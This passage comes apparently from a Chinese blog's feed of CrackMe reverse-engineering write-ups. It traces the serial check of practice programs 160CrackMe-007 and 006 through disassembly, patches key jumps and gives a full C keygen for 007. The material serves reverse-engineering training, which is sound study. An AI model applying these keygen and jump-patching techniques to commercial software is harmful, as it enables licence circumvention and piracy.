class="hljs-built_in">ecx</span><br>00442A42  |.  8BC8          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">eax</span><br>00442A44  |.  8B45 FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br>00442A47  |.  BE <span class="hljs-number">50000000</span>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-number">0x50</span><br>00442A4C  |.  <span class="hljs-number">99</span>            <span class="hljs-keyword">cdq</span><br>00442A4D  |.  F7FE          <span class="hljs-keyword">idiv</span> <span class="hljs-built_in">esi</span><br>00442A4F  |.  03CA          <span class="hljs-keyword">add</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">edx</span><br>00442A51  |.  <span class="hljs-number">41</span>            <span class="hljs-keyword">inc</span> <span class="hljs-built_in">ecx</span><br>00442A52  |.  <span class="hljs-number">894D</span> FC       <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>],<span class="hljs-built_in">ecx</span><br>00442A55  |.  3B5D FC       <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<br></code></pre></div></td></tr></table></figure><p>但是问题是，其中edi的值一直为0，这导致一直在计算的值都是0，然后再进行比较，是不可以的，必须要找到edi在何处被赋值。</p><p><img src="/2021/08/03/160CrackMe-007/5.png"></p><p>往上慢慢寻找一下，可以看到此处edi的值是通过eax赋值的，那么又要寻找eax的值，函数内部没有，需要出去函数寻找。</p><p><img src="/2021/08/03/160CrackMe-007/6.png"></p><p>出函数之后，看到eax的值是通过一个地址传递的</p><p><img src="/2021/08/03/160CrackMe-007/7.png"></p><p>继续找寻此地址的值是从何处得来，下硬件断点，没有断下来，说明不满足条件，不过在上面不远处就可以看到这个地址的赋值。看到如果想要进入此处需要让上面的JZ跳转不跳走，进入前面的函数看看</p><p><img src="/2021/08/03/160CrackMe-007/8.png"></p><p>进去发现是一个判断你输入的codice中是否含有非数字的一个判断，但是其中又有一点限制，就是第一位如果输入-，+，$，X，x，剩下都是数字的话，也是可以的，反正就是，输入非纯数字的codice以便可以进入后面，如果输入第一位为以上几个的话，那么其中还需要至少再含有一个非数字就可以。</p><p><img src="/2021/08/03/160CrackMe-007/9.png"></p><p>继续分析，再赋值前一条语句的函数就是关键的生成函数，进入分析，发现算法。</p><figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima"><span class="hljs-number">00442ACD</span>  |.  B9 <span class="hljs-number">01000000</span>   mov ecx,<span class="hljs-number">0x1</span><br><span class="hljs-number">00442AD2</span>  |&gt;  <span class="hljs-number">8B45</span> FC       /mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442AD5</span>  |.  <span class="hljs-number">0FB60408</span>      |movzx eax,byte ptr ds:[eax+ecx]<br><span class="hljs-number">00442AD9</span>  |.  BF <span class="hljs-number">11000000</span>   |mov edi,<span class="hljs-number">0x11</span><br><span class="hljs-number">00442ADE</span>  |.  33D2          |xor edx,edx<br><span class="hljs-number">00442AE0</span>  |.  F7F7          |div edi<br><span class="hljs-number">00442AE2</span>  |.  <span class="hljs-number">42</span>            |inc edx<br><span class="hljs-number">00442AE3</span>  |.  <span class="hljs-number">8B45</span> FC       |mov eax,dword ptr ss:[ebp-<span class="hljs-number">0x4</span>]<br><span class="hljs-number">00442AE6</span>  |.  <span class="hljs-number">0FB64408</span> FF   |movzx eax,byte ptr ds:[eax+ecx-<span class="hljs-number">0x1</span>]<br><span class="hljs-number">00442AEB</span>  |.  <span class="hljs-number">0FAFD0</span>        |imul edx,eax<br><span class="hljs-number">00442AEE</span>  |.  <span class="hljs-number">03F2</span>          |add esi,edx<br><span class="hljs-number">00442AF0</span>  |.  <span class="hljs-number">41</span>            |inc ecx                                 ;  user32.75B16D51<br><span class="hljs-number">00442AF1</span>  |.  4B            |dec ebx<br><span class="hljs-number">00442AF2</span>  |.^ <span class="hljs-number">75</span> DE         \jnz short aLoNg3x_.<span class="hljs-number">00442AD2</span><br><span class="hljs-number">00442AF4</span>  |.  EB <span class="hljs-number">02</span>         jmp short aLoNg3x_.<span class="hljs-number">00442AF8</span><br><span class="hljs-number">00442AF6</span>  |&gt;  33F6          xor esi,esi<br><span class="hljs-number">00442AF8</span>  |&gt;  8BC6          mov eax,esi<br><span class="hljs-number">00442AFA</span>  |.  B9 <span class="hljs-number">48710000</span>   mov ecx,<span class="hljs-number">0x7148</span><br><span class="hljs-number">00442AFF</span>  |.  <span class="hljs-number">99</span>            cdq<br><span class="hljs-number">00442B00</span>  |.  F7F9          idiv ecx                                 ;  user32.75B16D51<br><span class="hljs-number">00442B02</span>  |.  8BC2          mov eax,edx<br><span class="hljs-number">00442B04</span>  |.  <span class="hljs-number">99</span>            cdq<br><span class="hljs-number">00442B05</span>  |.  33C2          xor eax,edx                              ;  XOR0<br><span class="hljs-number">00442B07</span>  |.  2BC2          sub eax,edx                              ;  -<span class="hljs-number">0</span><br><span class="hljs-number">00442B09</span>  |.  8BD8          mov ebx,eax<br><span class="hljs-number">00442B0B</span>  |.  33C0          xor eax,eax<br></code></pre></div></td></tr></table></figure><p>这里会生成一个标志值，用于后面的计算</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szCodice);<br><span class="hljs-keyword">int</span> remainder;<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0x37B</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len ; i++) &#123;<br>remainder = szCodice[i] % <span class="hljs-number">0x11</span> + <span class="hljs-number">1</span>;<br>sum += remainder * szCodice[i - <span class="hljs-number">1</span>];<br>&#125;<br>sum = sum % <span class="hljs-number">0x7148</span>;<br><span class="hljs-keyword">return</span> sum;<br></code></pre></div></td></tr></table></figure><p>生成标志值之后就可以继续刚才的算法计算了，</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szName);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= len; j++) &#123;<br>sum += (szName[i] * szName[len - j]) * FlagNumber;<br>&#125;<br>&#125;<br>__asm &#123;<br>mov eax,sum<br>cdq<br><span class="hljs-keyword">xor</span> eax,edx<br>sub eax,edx<br>mov ecx,<span class="hljs-number">0xA2C2A</span><br>cdq<br>idiv ecx<br>mov ebx,edx<br>mov sum,ebx<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0xFFFFFFFF</span>; i++) &#123;<br><span class="hljs-keyword">if</span> (((i / <span class="hljs-number">0x59</span>) + (i % <span class="hljs-number">0x50</span>) + <span class="hljs-number">1</span>) == sum) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;codice:%d\n&quot;</span>, i);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>到这里算出了一个可以用的codice</p><p><img src="/2021/08/03/160CrackMe-007/11.png"></p><p>输入后发现又出现了一个again按钮。</p><p><img src="/2021/08/03/160CrackMe-007/10.png"></p><p>从dedark中找到againClick事件，经过分析发现其实是和OK按钮一模一样的流程，也就是把刚才输入的在输入一次就好了</p><p><img src="/2021/08/03/160CrackMe-007/12.png"></p><h4 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h4><p>完整注册机如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">//字母</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getFlagNumber</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szCodice)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szCodice);<br><span class="hljs-keyword">int</span> remainder;<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0x37B</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len ; i++) &#123;<br>remainder = szCodice[i] % <span class="hljs-number">0x11</span> + <span class="hljs-number">1</span>;<br>sum += remainder * szCodice[i - <span class="hljs-number">1</span>];<br>&#125;<br>sum = sum % <span class="hljs-number">0x7148</span>;<br><span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">OkClick</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szName,<span class="hljs-keyword">int</span> FlagNumber)</span> </span>&#123;<br><span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(szName);<br><span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= len; j++) &#123;<br>sum += (szName[i] * szName[len - j]) * FlagNumber;<br>&#125;<br>&#125;<br>__asm &#123;<br>mov eax,sum<br>cdq<br><span class="hljs-keyword">xor</span> eax,edx<br>sub eax,edx<br>mov ecx,<span class="hljs-number">0xA2C2A</span><br>cdq<br>idiv ecx<br>mov ebx,edx<br>mov sum,ebx<br>&#125;<br><span class="hljs-keyword">int</span> serial;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0xFFFFFFFF</span>; i++) &#123;<br><span class="hljs-keyword">if</span> (((i / <span class="hljs-number">0x59</span>) + (i % <span class="hljs-number">0x50</span>) + <span class="hljs-number">1</span>) == sum) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;codice:%d\n&quot;</span>, i);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请先输入第一位是字母的Codice以便生成标志值\n&quot;</span>);<br><span class="hljs-keyword">char</span> Codice[<span class="hljs-number">20</span>];<br>gets_s(Codice, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> FlagNumber = getFlagNumber(Codice);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入用户名\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br>OkClick(name, FlagNumber);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个程序就是需要先输入非纯数字codice生成一个标志值计算，然后再输入codice就可以了，连续两次即可。注册机那段内联汇编，实在不知道怎么用C写了…</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-006</title>
    <link href="/2021/08/02/160CrackMe-006/"/>
    <url>/2021/08/02/160CrackMe-006/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序如下看到OK是不可点击的，是一个灰色按钮。</p><p><img src="/2021/08/02/160CrackMe-006/1.png"></p><p>点击about查看一下，可以看到我们需要让两个按钮都消失以便可以看到Ringzer0的logo</p><p><img src="/2021/08/02/160CrackMe-006/2.png"></p><p>那么先想办法让OK变得可以点击吧。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查看壳，发现未加壳，是用Delphi写的</p><p><img src="/2021/08/02/160CrackMe-006/3.png"></p><p>使用API断点，给IsEnableWindow下断，但是发现怎么都无法断下来，说明肯定是有条件的，而当前还没有满足这个条件。</p><p>使用dedark工具帮忙查看，直接分析真的是太难找了，可以看到主要四个事件，这四个事件应该比较关键</p><p><img src="/2021/08/02/160CrackMe-006/4.png"></p><p>根据函数地址找到函数下好断点之后，查看可以发现nomechange和codicechange几乎是一样的，将两处明显的跳转更改条件使跳转失效，让程序跑起来后都会断在之前下的API断点上。那么它们都是比较关键的地方。</p><p>第一个关键跳转都是判断eax+0x47这个地址的值是否等于0，而第二个跳转都是先调用了00442A3C这个函数。</p><p>nomechange：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442E04</span>  /.  <span class="hljs-number">55</span>            push ebp                                 ;  nomeChange<br><span class="hljs-attribute">00442E05</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442E07</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E09</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E0B</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442E0C</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442E0E</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442E10</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442E11</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">9</span>B<span class="hljs-number">2</span>E<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">9</span>B<br><span class="hljs-attribute">00442E16</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442E19</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442E1C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442E22</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">00</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E26</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>F         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">37</span>              ;  关键跳转<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E28</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E2A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E30</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E32</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442E35</span>  |.  EB <span class="hljs-number">49</span>         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">80</span><br><span class="hljs-attribute">00442E37</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442E3A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442E40</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">7</span>B<span class="hljs-number">04</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E45</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]           ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442E48</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442E49</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E4C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442E52</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">6904</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E57</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E5A</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E5B</span>  |.  E<span class="hljs-number">8</span> DCFBFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">3</span>C<br><span class="hljs-attribute">00442E60</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442E62</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>F         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">73</span>               ;  关键跳转<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E64</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E66</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E6C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E6E</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442E71</span>  |.  EB <span class="hljs-number">0</span>D         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">80</span><br><span class="hljs-attribute">00442E73</span>  |&gt;  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442E75</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E7B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E7D</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]<br><span class="hljs-attribute">00442E80</span>  |&gt;  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442E82</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E83</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E84</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E85</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442E88</span>  |.  <span class="hljs-number">68</span> A<span class="hljs-number">22</span>E<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>EA<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E8D</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E90</span>  |.  BA <span class="hljs-number">02000000</span>   mov edx,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E95</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">4209</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>DC<br><span class="hljs-attribute">00442E9A</span>  \.  C<span class="hljs-number">3</span>            retn<br><span class="hljs-attribute">00442E9B</span>   .^ E<span class="hljs-number">9</span> D<span class="hljs-number">803</span>FCFF   jmp aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00403278</span><br><span class="hljs-attribute">00442EA0</span>   .^ EB EB         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">8</span>D<br><span class="hljs-attribute">00442EA2</span>   .  <span class="hljs-number">5</span>B            pop ebx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA3</span>   .  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA4</span>   .  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA5</span>   .  <span class="hljs-number">5</span>D            pop ebp                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA6</span>   .  C<span class="hljs-number">3</span>            retn<br><br><br></code></pre></div></td></tr></table></figure><p>codicechange：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 